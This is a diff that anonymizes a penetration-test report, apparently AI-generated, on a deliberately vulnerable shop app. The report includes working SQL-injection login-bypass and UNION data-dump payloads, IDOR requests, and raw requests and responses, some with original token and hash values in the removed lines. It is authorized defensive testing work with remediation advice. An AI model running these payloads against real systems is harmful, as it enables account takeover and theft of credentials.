@@ -1,8 +1,8 @@
-# Vulnerability Assessment Report — 127.0.0.1:3000
+# Vulnerability Assessment Report — demo-shop.local:8080
 
 **Classification:** CONFIDENTIAL — Restricted to authorized personnel  
 **Generated:** 2026-09-24T10:30:54Z  
-**Target:** 127.0.0.1:3000  
+**Target:** demo-shop.local:8080  
 **Campaign:** camp_20260924_70602bf9  
 **Methodology:** ISO 27001 / NIST SP 800-115 / MITRE ATT&CK  
 
@@ -14,7 +14,7 @@
 
 ### Overall Security Posture: 🔴 CRITICAL — Immediate Action Required
 
-The system tested (**127.0.0.1:3000**) presents an **extremely poor security posture**. Our team confirmed 2 critical and 1 high severity vulnerabilities, enabling complete compromise through multiple independent attack paths.
+The system tested (**demo-shop.local:8080**) presents an **extremely poor security posture**. Our team confirmed 2 critical and 1 high severity vulnerabilities, enabling complete compromise through multiple independent attack paths.
 
 ### Most Critical Issues
 
@@ -37,7 +37,7 @@ The login endpoint builds its SQL WHERE clause by concatenating the raw `email` 
 
 ## 1. EXECUTIVE SUMMARY
 
-> Bounded validation run against OWASP Juice Shop (127.0.0.1:3000) scoped strictly to SQL injection and IDOR/broken access control. Two critical/high-severity SQL injection flaws were fully exploited: an unauthenticated UNION-based injection in the product search endpoint that exfiltrated real user password hashes, and a classic auth-bypass injection in the login endpoint that yielded a valid administrator session with zero credentials. Two medium-severity IDOR findings were confirmed on the basket and user-profile REST endpoints, where any authenticated low-privilege customer could read another user's (including the admin's) basket contents and profile data by manipulating the numeric resource id; the corresponding write path was verified to correctly enforce ownership, limiting impact to read-only disclosure. No other vulnerability classes were tested, per explicit scope restriction.
+> Bounded validation run against OWASP Demo Shop (demo-shop.local:8080) scoped strictly to SQL injection and IDOR/broken access control. Two critical/high-severity SQL injection flaws were fully exploited: an unauthenticated UNION-based injection in the product search endpoint that exfiltrated real user password hashes, and a classic auth-bypass injection in the login endpoint that yielded a valid administrator session with zero credentials. Two medium-severity IDOR findings were confirmed on the basket and user-profile REST endpoints, where any authenticated low-privilege customer could read another user's (including the admin's) basket contents and profile data by manipulating the numeric resource id; the corresponding write path was verified to correctly enforce ownership, limiting impact to read-only disclosure. No other vulnerability classes were tested, per explicit scope restriction.
 
 **Overall Risk Level: CRITICAL**
 
@@ -89,26 +89,26 @@ The login endpoint builds its SQL WHERE clause by concatenating the raw `email` 
 
 #### Description
 
-The login endpoint /rest/user/login builds a raw SQL query from the user-supplied "email" field without parameterization. Submitting a classic SQL injection comment-out payload as the email value (admin@juice-sh.op' --) causes the WHERE clause password check to be nullified, allowing authentication as the admin account without knowing its password. The server returned HTTP 200 with a full, validly-signed JWT authentication token for the admin user (role: admin, id: 1, email: admin@juice-sh.op), including the admin's bcrypt/md5 password hash embedded in the JWT payload. This is a complete authentication bypass leading directly to administrative account takeover. A second payload variant confirmed the underlying SQL error by triggering a Sequelize/SQLite exception with full stack trace disclosure (query.js execution path leaked), corroborating that the input is concatenated directly into the SQL statement.
+The login endpoint /rest/user/login builds a raw SQL query from the user-supplied "email" field without parameterization. Submitting a classic SQL injection comment-out payload as the email value (admin@demo-shop.local' --) causes the WHERE clause password check to be nullified, allowing authentication as the admin account without knowing its password. The server returned HTTP 200 with a full, validly-signed JWT authentication token for the admin user (role: admin, id: 1, email: admin@demo-shop.local), including the admin's bcrypt/md5 password hash embedded in the JWT payload. This is a complete authentication bypass leading directly to administrative account takeover. A second payload variant confirmed the underlying SQL error by triggering a Sequelize/SQLite exception with full stack trace disclosure (query.js execution path leaked), corroborating that the input is concatenated directly into the SQL statement.
 
 #### Technical Analysis
 
-The application concatenates the raw email input into a SQL WHERE clause used for password verification (typical Juice Shop pattern: SELECT * FROM Users WHERE email = '<input>' AND password = '<hash>'). By injecting admin@juice-sh.op' -- the trailing password comparison is commented out, so the query effectively becomes "WHERE email = 'admin@juice-sh.op'" with no password check, causing the backend to authenticate as admin. The response includes a complete, correctly-signed RS256 JWT identical to a legitimate admin session token, which can be used immediately to call any admin-only REST endpoint. The follow-up malformed payload variant produced an unhandled SQLite query exception with a full Node.js/Sequelize stack trace, independently proving the injection point and that error handling leaks internal file paths.
+The application concatenates the raw email input into a SQL WHERE clause used for password verification (typical Demo Shop pattern: SELECT * FROM Users WHERE email = '<input>' AND password = '<hash>'). By injecting admin@demo-shop.local' -- the trailing password comparison is commented out, so the query effectively becomes "WHERE email = 'admin@demo-shop.local'" with no password check, causing the backend to authenticate as admin. The response includes a complete, correctly-signed RS256 JWT identical to a legitimate admin session token, which can be used immediately to call any admin-only REST endpoint. The follow-up malformed payload variant produced an unhandled SQLite query exception with a full Node.js/Sequelize stack trace, independently proving the injection point and that error handling leaks internal file paths.
 
 #### Exploitation Commands
 
 ```bash
-curl -s -i -X POST http://127.0.0.1:3000/rest/user/login -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op'"'"' --","password":"anything"}'
+curl -s -i -X POST http://demo-shop.local:8080/rest/user/login -H "Content-Type: application/json" -d '{"email":"admin@demo-shop.local'"'"' --","password":"anything"}'
 ```
 
 #### Raw Request
 
 ```http
 POST /rest/user/login HTTP/1.1
-Host: 127.0.0.1:3000
+Host: demo-shop.local:8080
 Content-Type: application/json
 
-{"email":"admin@juice-sh.op' --","password":"anything"}
+{"email":"admin@demo-shop.local' --","password":"anything"}
 ```
 
 #### Raw Response
@@ -117,14 +117,14 @@ Content-Type: application/json
 HTTP/1.1 200 OK
 Content-Type: application/json; charset=utf-8
 
-{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsIi4uLg==","bid":1,"umail":"EMAIL_001"}}
+{"authentication":{"token":"DEMO.JWT.TOKEN==","bid":1,"umail":"EMAIL_001"}}
 ```
 
 #### Evidence / Logs
 
 ```
-Request 1: email="admin@juice-sh.op' --", password="anything" -> HTTP 200, admin JWT issued (role:admin, id:1, email:admin@juice-sh.op, password hash disclosed in token payload)
-Request 2: email="admin@juice-sh.op')-- ", password="x" -> HTTP 500, Sequelize/SQLite stack trace disclosed confirming raw SQL concatenation
+Request 1: email="admin@demo-shop.local' --", password="anything" -> HTTP 200, admin JWT issued (role:admin, id:1, email:admin@demo-shop.local, password hash disclosed in token payload)
+Request 2: email="admin@demo-shop.local')-- ", password="x" -> HTTP 500, Sequelize/SQLite stack trace disclosed confirming raw SQL concatenation
 ```
 
 #### Remediation
@@ -161,17 +161,17 @@ This is complete end-to-end authentication bypass, not a mere signal: the server
 #### Exploitation Commands
 
 ```bash
-curl -s -i -X POST http://127.0.0.1:3000/rest/user/login -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op' OR 1=1--\",\"password\":\"x\"}"
+curl -s -i -X POST http://demo-shop.local:8080/rest/user/login -H "Content-Type: application/json" -d "{\"email\":\"admin@demo-shop.local' OR 1=1--\",\"password\":\"x\"}"
 ```
 
 #### Raw Request
 
 ```http
 POST /rest/user/login HTTP/1.1
-Host: 127.0.0.1:3000
+Host: demo-shop.local:8080
 Content-Type: application/json
 
-{"email":"admin@juice-sh.op' OR 1=1--","password":"x"}
+{"email":"admin@demo-shop.local' OR 1=1--","password":"x"}
 ```
 
 #### Raw Response
@@ -179,15 +179,15 @@ Content-Type: application/json
 ```http
 HTTP/1.1 200 OK
 Content-Type: application/json; charset=utf-8
-{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInJvbGUiOiJhZG1pbiIsIi4uLg.SIGNATURE","bid":1,"umail":"EMAIL_001"}}
+{"authentication":{"token":"DEMO.JWT.TOKEN","bid":1,"umail":"EMAIL_001"}}
 ```
 
 #### Evidence / Logs
 
 ```
-Request: POST /rest/user/login body {"email":"admin@juice-sh.op' OR 1=1--","password":"x"}
+Request: POST /rest/user/login body {"email":"admin@demo-shop.local' OR 1=1--","password":"x"}
 Response: HTTP 200, JSON body contains authentication.token = valid RS256-signed JWT.
-Decoded JWT payload: {"id":1,"email":"admin@juice-sh.op","password":"0192023a7bbd73250516f069df18b500","role":"admin", ...}
+Decoded JWT payload: {"id":1,"email":"admin@demo-shop.local","password":"00000000000000000000000000000000","role":"admin", ...}
 No valid password was ever supplied; the attacker used the literal string "x" as password and still received a fully authenticated admin session token usable for subsequent API calls (verified working in the IDOR findings below).
 ```
 
@@ -225,14 +225,14 @@ This proves genuine UNION-based SQL injection: the injected query successfully j
 #### Exploitation Commands
 
 ```bash
-curl -s -i "http://127.0.0.1:3000/rest/products/search?q=apple%27))+UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+Users--"
+curl -s -i "http://demo-shop.local:8080/rest/products/search?q=apple%27))+UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+Users--"
 ```
 
 #### Raw Request
 
 ```http
 GET /rest/products/search?q=apple%27))+UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+Users-- HTTP/1.1
-Host: 127.0.0.1:3000
+Host: demo-shop.local:8080
 ```
 
 #### Raw Response
@@ -240,7 +240,7 @@ Host: 127.0.0.1:3000
 ```http
 HTTP/1.1 200 OK
 Content-Type: application/json; charset=utf-8
-{"status":"success","data":[{"id":1,"name":"EMAIL_001","description":"0192023a7bbd73250516f069df18b500","price":4,...}, ... 24 rows ...]}
+{"status":"success","data":[{"id":1,"name":"EMAIL_001","description":"00000000000000000000000000000000","price":4,...}, ... 24 rows ...]}
 ```
 
 #### Evidence / Logs
@@ -248,7 +248,7 @@ Content-Type: application/json; charset=utf-8
 ```
 Request sent with q=apple')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--
 Response: HTTP 200, JSON array where product "name" field = anonymized email placeholder (EMAIL_001..EMAIL_024, "demo" for id 17) and "description" field = MD5 password hash.
-Cross-checked: id=1 description hash "0192023a7bbd73250516f069df18b500" matches the exact password hash field returned in the admin account's own JWT payload obtained via the login SQLi bypass finding (id:1, email:admin@juice-sh.op, password:"0192023a7bbd73250516f069df18b500") — confirming the extracted data is the REAL Users table content, not a coincidence.
+Cross-checked: id=1 description hash "00000000000000000000000000000000" matches the exact password hash field returned in the admin account's own JWT payload obtained via the login SQLi bypass finding (id:1, email:admin@demo-shop.local, password:"00000000000000000000000000000000") — confirming the extracted data is the REAL Users table content, not a coincidence.
 ```
 
 #### Remediation
@@ -285,14 +285,14 @@ This is demonstrated, not theoretical: a session belonging to user id=2 (role cu
 #### Exploitation Commands
 
 ```bash
-curl -s -i http://127.0.0.1:3000/rest/basket/1 -H "Authorization: Bearer <JIM_customer_JWT_bid=2>"
+curl -s -i http://demo-shop.local:8080/rest/basket/1 -H "Authorization: Bearer <JIM_customer_JWT_bid=2>"
 ```
 
 #### Raw Request
 
 ```http
 GET /rest/basket/1 HTTP/1.1
-Host: 127.0.0.1:3000
+Host: demo-shop.local:8080
 Authorization: Bearer eyJ...(jim, id:2, role:customer, bid:2)
 ```
 
@@ -301,15 +301,15 @@ Authorization: Bearer eyJ...(jim, id:2, role:customer, bid:2)
 ```http
 HTTP/1.1 200 OK
 Content-Type: application/json; charset=utf-8
-{"status":"success","data":{"id":1,"coupon":null,"UserId":1,"Products":[{"id":1,"name":"Apple Juice (1000ml)", ...},{"id":2,"name":"Orange Juice (1000ml)", ...},{"id":3,"name":"Eggfruit Juice (500ml)", ...}]}}
+{"status":"success","data":{"id":1,"coupon":null,"UserId":1,"Products":[{"id":1,"name":"Apple Demo (1000ml)", ...},{"id":2,"name":"Orange Demo (1000ml)", ...},{"id":3,"name":"Eggfruit Demo (500ml)", ...}]}}
 ```
 
 #### Evidence / Logs
 
 ```
-1) Obtained a low-privilege customer session via a targeted SQLi-comment login (email="jim@juice-sh.op'--") -> JWT with id:2, role:customer, bid:2.
-2) Confirmed jim's own basket at GET /rest/basket/2 returns UserId:2, own products (Raspberry Juice).
-3) Called GET /rest/basket/1 with the SAME jim (customer, non-owner) token -> HTTP 200, returned UserId:1 (admin) basket with 3 unrelated products (Apple/Orange/Eggfruit Juice) belonging to the admin account.
+1) Obtained a low-privilege customer session via a targeted SQLi-comment login (email="jim@demo-shop.local'--") -> JWT with id:2, role:customer, bid:2.
+2) Confirmed jim's own basket at GET /rest/basket/2 returns UserId:2, own products (Raspberry Demo).
+3) Called GET /rest/basket/1 with the SAME jim (customer, non-owner) token -> HTTP 200, returned UserId:1 (admin) basket with 3 unrelated products (Apple/Orange/Eggfruit Demo) belonging to the admin account.
 4) No ownership check was enforced; only presence of a valid JWT was required.
 ```
 
@@ -347,14 +347,14 @@ Demonstrated cross-account data disclosure: a non-privileged customer session en
 #### Exploitation Commands
 
 ```bash
-curl -s -i http://127.0.0.1:3000/api/Users/1 -H "Authorization: Bearer <JIM_customer_JWT_id=2>"
+curl -s -i http://demo-shop.local:8080/api/Users/1 -H "Authorization: Bearer <JIM_customer_JWT_id=2>"
 ```
 
 #### Raw Request
 
 ```http
 GET /api/Users/1 HTTP/1.1
-Host: 127.0.0.1:3000
+Host: demo-shop.local:8080
 Authorization: Bearer eyJ...(jim, id:2, role:customer)
 ```
 
@@ -405,4 +405,4 @@ Restrict `GET /api/Users/:id` to the record owner or an administrator role, enfo
 *Report auto-generated by Darkmoon AI Security Platform*  
 *Classification: CONFIDENTIAL — Restricted to authorized personnel*  
 *Generated: 2026-09-24T10:30:54Z*  
-*Campaign: camp_20260924_70602bf9 | Target: 127.0.0.1:3000*
+*Campaign: camp_20260924_70602bf9 | Target: demo-shop.local:8080*
